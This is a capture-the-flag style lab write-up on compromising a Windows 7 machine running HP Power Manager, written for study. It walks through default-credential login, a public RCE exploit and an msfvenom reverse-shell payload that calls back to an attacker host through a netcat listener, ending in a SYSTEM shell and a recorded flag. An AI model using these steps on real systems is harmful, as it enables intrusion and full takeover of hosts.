# Kevin - Windows 7 Exploitation Walkthrough

This repository documents the exploitation process of the **Kevin** lab machine running Windows 7 Ultimate. The objective was to perform a full system compromise through enumeration, exploitation, and privilege escalation, ultimately retrieving the Administrator flag.

## 🧠 Target Overview

- **IP Address:** 192.168.232.45
- **Operating System:** Windows 7 Ultimate N (Build 7600)
- **Hostname:** KEVIN
- **Workgroup:** WORKGROUP

## 🔍 Initial Reconnaissance

### Nmap Scan

```bash
nmap -T4 -A 192.168.232.45 -oN nmap

Key Open Ports:
80/tcp: GoAhead WebServer - HP Power Manager interface
135/tcp: Microsoft Windows RPC
139, 445/tcp: SMB services
3389/tcp: RDP enabled
49152–49159/tcp: MSRPC dynamic ports

🌐 Web Application Enumeration
Accessed HTTP service on port 80: HP Power Manager login interface

Default credentials worked:
pgsql
Copy
Edit
-Username: admin
-Password: admin

🚨 Exploitation
Vulnerability Identified
The HP Power Manager application is vulnerable to Remote Code Execution.

Exploit found via searchsploit:
bash
Copy
Edit
searchsploit HP Power Manager
searchsploit -m 10099.py
Reverse Shell Payload Generation

Used msfvenom to create a reverse shell payload avoiding known bad characters:
bash
Copy
Edit
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.45.158 LPORT=80 \
  -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" \
  -e x86/alpha_mixed -f c
Payload inserted into the SHELL variable inside the exploit code (10099.py)

Listener started with:

bash
Copy
Edit
rlwrap nc -nlvp 80
Gaining Shell Access
Exploit executed:

bash
Copy
Edit
python2.7 10099.py 192.168.232.45
Reverse shell received as NT AUTHORITY\SYSTEM

🧾 Flag
Navigated to C:\Users\Administrator\Desktop and retrieved:

makefile
Copy
Edit
Flag: f9267403b0baf51ae5c66c6d55fd72de

🧰 Tools Used
-nmap
-searchsploit
-msfvenom
-python2.7
-netcat (nc)
-rlwrap

✅ Summary
Weak authentication on a vulnerable web application allowed full system compromise.
Default credentials and known exploit code were sufficient for privilege escalation.
Full administrative access was gained through RCE, and the flag was captured.

Author: Farhanahmad Quraishi
